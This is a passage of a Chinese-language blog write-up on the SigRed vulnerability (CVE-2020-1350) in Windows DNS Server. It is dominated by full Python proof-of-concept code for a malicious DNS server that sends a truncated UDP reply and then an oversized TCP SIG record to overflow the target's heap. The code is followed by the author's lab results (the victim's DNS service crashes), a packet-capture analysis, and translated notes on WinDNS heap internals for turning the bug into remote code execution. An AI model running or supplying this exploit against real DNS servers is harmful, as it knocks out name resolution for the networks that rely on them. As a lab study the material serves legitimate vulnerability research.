class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">sock.bind((server_address, server_port))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets up two servers: one on UDP port 53 and one on TCP port 53</span></span><br><span class="line">first = threading.Thread(target=udp_server)</span><br><span class="line">second = threading.Thread(target=tcp_server)</span><br><span class="line"></span><br><span class="line">first.start()</span><br><span class="line">second.start()</span><br><span class="line"></span><br><span class="line">first.join()</span><br><span class="line">second.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    这个脚本的总的思路来说就是利用双线程运行了tcp_server与udp_server两个模块，两模块中其实耦合还是很强的，将消息内容硬编码到字符串中，然后发送给靶机。</p><p>​    然而其实双线程并不好用，所以我们来对脚本进行一个小修正，将其分为tcp和udp连接两个模块，同时启动，在ucp模块执行时，tcp等待：</p><p><strong>tcp_connect.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><strong>udp_connect.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">server_port = <span class="number">53</span></span><br><span class="line">response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Data</span></span><br><span class="line">data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Authoritative Nameservers</span></span><br><span class="line">response += <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Compressed pointer to &quot;4.ibrokethe.net&quot;</span></span><br><span class="line">response += <span class="string">&quot;\x00\x06&quot;</span> <span class="comment"># Type: SOA</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">response += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(data)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line">sock.bind((server_address, server_port))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">recvd, client_address = sock.recvfrom(<span class="number">65535</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received UDP connection&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(recvd) &gt; <span class="number">2</span>:</span><br><span class="line">sent = sock.sendto(recvd[:<span class="number">2</span>] + response + data, client_address)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp start listens&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;python sigred_dos.py evil_domain&quot;</span>) <span class="comment"># For example, I ran python `sigred_dos.py ibrokethe.net`</span></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain name must be *a maximum* of 19 characters in length</span></span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(domain) &gt; <span class="number">19</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Domain length must be less than 20 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">setup()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finish_setup&#x27;</span>)</span><br><span class="line">    udp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;udp_finish&#x27;</span>)</span><br><span class="line">    tcp_server()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;tcp_finish&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="三、POC执行"><a href="#三、POC执行" class="headerlink" title="三、POC执行"></a>三、POC执行</h3><p>运行脚本结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162633329.png" alt="image-20220310162633329"></p><p>靶机上的dns服务被迫关闭了；</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310162741198.png" alt="image-20220310162741198"></p><p>攻击者这边显示收到了tcp和udp连接。</p><h2 id="0x06-流量分析"><a href="#0x06-流量分析" class="headerlink" title="0x06 流量分析"></a>0x06 流量分析</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163153912.png" alt="image-20220310163153912"></p><p>抓包得到，编号98为我们发送的第一条数据包，这条数据包通过更改tc字段，申请建立tcp连接：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310163431476.png" alt="image-20220310163431476"></p><p>可以看到tcp三次握手的过程（上图中编号120开始）。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220310164244803.png" alt="image-20220310164244803"></p><p>在tcp消息中找到我们构造的tcp-sig包，图中圈出的c0 0c指向了前面的域名部分，构造了溢出。</p><p>​    整体的过程就是，由于win server2016本地无法解析“cve1350.com”，因此会以UDP协议向恶意服务器kali发送DNS查询，也就是kali收到的第一个UDP连接。<br>​    恶意服务就向受害者发送响应包，设置TC位，通知受害者采用TCP重发原来的查询请求，并允许返回的响应报文超过512个字节。这是第二个DNS包。<br>​    然后进行三次握手，受害者再次以TCP协议发送请求，这就是kali收到的TCP连接。之后，恶意服务器就可以利用TCP传输大于64KB的响应包发给受害者，触发漏洞，造成堆溢出。</p><h2 id="0x07-exp原理"><a href="#0x07-exp原理" class="headerlink" title="0x07 exp原理"></a>0x07 exp原理</h2><p>​    其实这个漏洞利用最难的部分就是如何在不破坏堆的情况下，做一个类似反弹shell的东西？在本部分中涉及到的知识我也不能完全理解，只能说尽力而为吧。</p><p>参考，引用，翻译自：<br><a href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a><br><a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p><p><strong>注：本部分图片以及文本均源自上述两个链接，并非原创，仅作翻译总结</strong></p><h3 id="一、背景知识"><a href="#一、背景知识" class="headerlink" title="一、背景知识"></a>一、背景知识</h3><h4 id="WinDNS-堆管理器（堆操作）"><a href="#WinDNS-堆管理器（堆操作）" class="headerlink" title="WinDNS 堆管理器（堆操作）"></a>WinDNS 堆管理器（堆操作）</h4><p>​    WinDNS 服务通过管理自己的内存池，以达到管理堆内存的目的。如果请求的缓冲区大小超过 0xA0 字节，它将从 Windows 本机堆管理器 ( <strong>HeapAlloc</strong> ) 请求内存；否则，它将使用memory pool bucket，每个bucket中的缓冲区都被储存在一个单链表中。如果所选memory pool bucket中没有更多可用缓冲区，则会从本机堆中请求一个内存块，划分为单独的缓冲区，然后添加到相应存储桶的列表中。</p><p>​    简单的说，就是WinDNS 管理自己的内存池。有 4 个内存池桶 用于不同的分配大小（0x50、0x68、0x88、0xa0）。如果所需的分配大小大于 0xa0，WinDNS 将使用本机 Windows 堆。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316084140261.png" alt="image-20220316084140261"></p><p>​    <em>上图为dns!Mem_Alloc 的反编译</em></p><p>‍</p><p>​    当其中一个内存桶中的缓冲区被释放时，它们不会返回到 Windows 本机堆。相反，它们会被添加回该存储桶的可用缓冲区列表中。缓冲区是按后进先出 (LIFO) 分配的，这意味着要释放的最后一个缓冲区将是下一个要分配的缓冲区。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316085438468.png" alt="image-20220316085438468"></p><p>​    <em>dns反编译！Mem_Free</em></p><h4 id="WinDNS-缓冲区结构"><a href="#WinDNS-缓冲区结构" class="headerlink" title="WinDNS 缓冲区结构"></a>WinDNS 缓冲区结构</h4><p>WinDNS 缓冲区的结构如下：</p><p>​    这个结构就是相当于缓冲区里没有东西时，应该放什么。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c6222017782f24e4d1_aa91b3_6a9906be77d3468aa059e7ce333c7027~mv2.png" alt="img"></p><p>在开发exp的过程中，我们需要用到这个结构。</p><h4 id="RR-record结构"><a href="#RR-record结构" class="headerlink" title="RR_record结构"></a>RR_record结构</h4><p>这个结构就是我们储存一条dns记录在堆中的结构。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c8c2e0bb08a5b1629f_aa91b3_2e95baa7527f41e3b4fc7dec0c87a822~mv2.png" alt="img"></p><h3 id="二、开辟地址，避免分段错误（打洞）"><a href="#二、开辟地址，避免分段错误（打洞）" class="headerlink" title="二、开辟地址，避免分段错误（打洞）"></a>二、开辟地址，避免分段错误（打洞）</h3><p>​    如果我们可以在一个连续堆段的中间触发释放缓冲区，然后重新分配它给另一条数据，这条数据我们构造溢出缓冲区，我们就可以获得一大片地址，但是于此同时，我们需要避免出现segfault。</p><p>​    那么，什么时候会发生segfault呢？顾名思义，就是当系统检测到地址放的东西与应该放的东西不一样的时候就会报错，那么系统监测发生在什么时候呢？就是在进行HeapAlloc 和 HeapFree 的时候，我们只要HeapFree的调用，就不会出现segfault</p><p>​    